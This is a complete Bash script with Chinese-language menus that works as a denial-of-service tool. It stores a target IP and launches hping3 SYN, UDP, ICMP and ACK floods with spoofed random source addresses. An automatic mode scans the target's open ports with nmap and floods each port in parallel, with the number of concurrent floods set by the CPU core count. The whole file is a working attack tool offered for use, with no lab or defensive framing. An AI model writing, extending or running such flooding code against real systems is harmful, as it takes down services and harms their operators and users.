#!/bin/bash
export LANG=en_US.UTF-8

# 全局变量
TARGET_IP_FILE="$HOME/target_ip.conf"
TARGET_IP=""
CONCURRENT_ATTACKS=0

# 初始化函数
initself() {
    selfversion='0.1'
    datevar=$(date +%Y-%m-%d_%H:%M:%S)
    menuname='首页'
    parentfun=''

    # 颜色定义
    _red() {
        printf '\033[0;31;31m%b\033[0m' "$1"
        echo
    }
    _green() {
        printf '\033[0;31;32m%b\033[0m' "$1"
        echo
    }
    _yellow() {
        printf '\033[0;31;33m%b\033[0m' "$1"
        echo
    }
    _blue() {
        printf '\033[0;31;36m%b\033[0m' "$1"
        echo
    }


    # 等待输入
    waitinput() {
        echo
        read -n1 -r -p "按任意键继续...(退出 Ctrl+C)"
    }

    # 加载动画
    loading() {
        local pid=$1
        local delay=0.1
        local spinstr='|/-\'
        tput civis # 隐藏光标
        while kill -0 $pid 2>/dev/null; do
            local temp=${spinstr#?}
            printf "\r\033[0;31;36m[ %c ] 正在执行...\033[0m" "$spinstr"
            local spinstr=$temp${spinstr%"$temp"}
            sleep $delay
        done
        tput cnorm        # 恢复光标
        printf "\r\033[K" # 清除行
    }

    # 字符跳动效果
    jumpfun() {
        local str=$1
        local delay=${2:-0.05}
        for ((i = 0; i < ${#str}; i++)); do
            printf '\033[0;31;36m%b\033[0m' "${str:$i:1}"
            sleep "$delay"
        done
        echo
    }

    # 检查依赖
    check_deps() {
        local deps=("hping3" "nmap" "curl")
        for dep in "${deps[@]}"; do
            if ! command -v "$dep" &>/dev/null; then
                _yellow "$dep 未安装，正在安装..."
                apt update && apt install "$dep" -y
            fi
        done
    }

    # 菜单头部
    menutop() {
        clear
        _yellow '                          ┌──►   '
        _yellow '─────────────────────#────┼────► '
        _yellow '                          └──►   '
        _blue "v: $selfversion"
        echo
        _yellow "当前菜单: $menuname "
        echo
    }

    # 菜单渲染
    menu() {
        menutop
        local options=("$@")
        local num_options=${#options[@]}
        local max_len=0

        for ((i = 0; i < num_options; i += 2)); do
            local str_len=${#options[i]}
            ((str_len > max_len)) && max_len=$str_len
        done

        for ((i = 0; i < num_options; i += 4)); do
            printf "%s%*s  " "$((i / 2 + 1)): ${options[i]}" "$((max_len - ${#options[i]}))"
            [[ -n "${options[i + 2]}" ]] && printf "$((i / 2 + 2)): ${options[i + 2]}"
            echo -e "\n"
        done

        _blue "q: 退出  b: 返回  0: 首页"
        echo
        read -ep "请输入命令号: " number

        case "$number" in
        [1-$((num_options / 2))])
            local action_index=$((2 * (number - 1) + 1))
            parentfun=${options[action_index]}
            ${options[action_index]}
            waitinput
            ${FUNCNAME[3]}
            ;;
        0) main ;;
        b) ${FUNCNAME[3]} ;;
        q) exit ;;
        *)
            _red '输入错误'
            waitinput
            main
            ;;
        esac
    }
    load_target_ip
    trap cleanup EXIT # 脚本退出时清理
}

# 加载目标 IP
load_target_ip() {
    if [[ -f "$TARGET_IP_FILE" ]]; then
        TARGET_IP=$(cat "$TARGET_IP_FILE")
        _green "加载目标 IP: $TARGET_IP"
    fi
}

# 保存目标 IP
save_target_ip() {
    echo "$TARGET_IP" >"$TARGET_IP_FILE"
    jumpfun "目标 IP 已保存到 $TARGET_IP_FILE"
}

# 清理函数
cleanup() {
    _yellow "清理中，杀掉所有并发进程..."
    pkill -P $$ # 杀掉当前脚本的所有子进程
    jumpfun "清理完成"
}


# 配置被攻击 IP
configure_target_ip() {
    read -ep "请输入目标 IP: " TARGET_IP
    save_target_ip
}

# 执行攻击的通用函数
execute_attack() {
    local attack_type=$1
    local attack_flag=$2
    local target_ip=$3
    local target_port=$4
    local packet_size=$5
    local duration=$6

    if [[ "$attack_type" == "ICMP" ]]; then
        _yellow "攻击类型: $attack_type"
        _yellow "目标: $target_ip"
        _yellow "命令: hping3 -c $((duration * 1000)) -d $packet_size $attack_flag --flood --rand-source $target_ip"
        hping3 -c $((duration * 1000)) -d "$packet_size" $attack_flag --flood --rand-source "$target_ip" &
    else
        _yellow "攻击类型: $attack_type"
        _yellow "目标: $target_ip:$target_port"
        _yellow "命令: hping3 -c $((duration * 1000)) -d $packet_size $attack_flag -p $target_port --flood --rand-source $target_ip"
        hping3 -c $((duration * 1000)) -d "$packet_size" $attack_flag -p "$target_port" --flood --rand-source "$target_ip" &
    fi
}

# 手动攻击模式
hping3_attack() {
    menuname="HPING3攻击"

    attack_menu() {
        local attack_type=$1
        local attack_flag=$2

        if [[ -z "$TARGET_IP" ]]; then
            _red "请先配置目标 IP"
            waitinput
            return
        fi

        read -ep "数据包大小(默认120): " packet_size
        packet_size=${packet_size:-120}
        read -ep "持续时间(秒，默认60): " duration
        duration=${duration:-60}

        if [[ "$attack_type" != "ICMP" ]]; then
            read -ep "目标端口(默认80): " target_port
            target_port=${target_port:-80}
        fi

        jumpfun "开始执行攻击..."
        execute_attack "$attack_type" "$attack_flag" "$TARGET_IP" "$target_port" "$packet_size" "$duration"
        local pid=$!
        loading $pid
        wait $pid
        jumpfun "攻击完成"
    }

    options=(
        "SYN Flood" "attack_menu SYN -S"
        "UDP Flood" "attack_menu UDP --udp"
        "ICMP Flood" "attack_menu ICMP --icmp"
        "ACK Flood" "attack_menu ACK -A"
    )
    menu "${options[@]}"
}

# 全自动攻击模式
auto_attack() {
    menuname="全自动攻击"

    if [[ -z "$TARGET_IP" ]]; then
        _red "请先配置目标 IP"
        waitinput
        main
        return
    fi

    _yellow "开始扫描目标的常用端口..."
    local open_ports=$(nmap -p 1-1024,3306,3389,8080,8888,8443 --min-rate=1000 -T4 "$TARGET_IP" | grep 'open' | awk -F '/' '{print $1}')
    jumpfun "开放端口: $open_ports"

    local attack_types=()
    if [[ -n "$open_ports" ]]; then
        for port in $open_ports; do
            attack_types+=("SYN" "-S" "$port")
            attack_types+=("ACK" "-A" "$port")
            attack_types+=("UDP" "--udp" "$port")
        done
    else
        attack_types+=("ICMP" "--icmp" "")
    fi

    CONCURRENT_ATTACKS=$(nproc) # 获取 CPU 核心数
    _yellow "根据 CPU 核心数并发执行攻击: $CONCURRENT_ATTACKS"

    for ((i = 0; i < ${#attack_types[@]}; i += 3)); do
        local attack_type=${attack_types[i]}
        local attack_flag=${attack_types[i + 1]}
        local target_port=${attack_types[i + 2]}

        _yellow "执行 $attack_type 攻击..."
        execute_attack "$attack_type" "$attack_flag" "$TARGET_IP" "$target_port" 120 60
        
        # 控制并发数
        while [[ $(jobs -r | wc -l) -ge $CONCURRENT_ATTACKS ]]; do
            sleep 1
        done
    done
    wait # 等待所有子进程完成
    _green "全自动攻击完成"
}

# NMAP扫描函数
nmap_scan() {
    menuname="NMAP扫描"

    execute_scan() {
        local scan_type=$1
        local scan_flag=$2

        read -ep "目标 IP/域名: " target
        _yellow "执行 $scan_type 扫描: $target"

        nmap $scan_flag "$target" &
        local pid=$!
        loading $pid
        wait $pid
        jumpfun "扫描完成"
    }

    options=(
        "快速扫描" "execute_scan Quick -F"
        "全面扫描" "execute_scan Comprehensive -A"
        "端口扫描" "execute_scan Ports -p-"
    )
    menu "${options[@]}"
}

# 主菜单
main() {
    menuname='首页'
    check_deps
    options=(
        "配置目标 IP" configure_target_ip
        "HPING3攻击" hping3_attack
        "NMAP扫描" nmap_scan
        "全自动攻击" auto_attack
    )
    menu "${options[@]}"
}

# 初始化并启动
initself
main
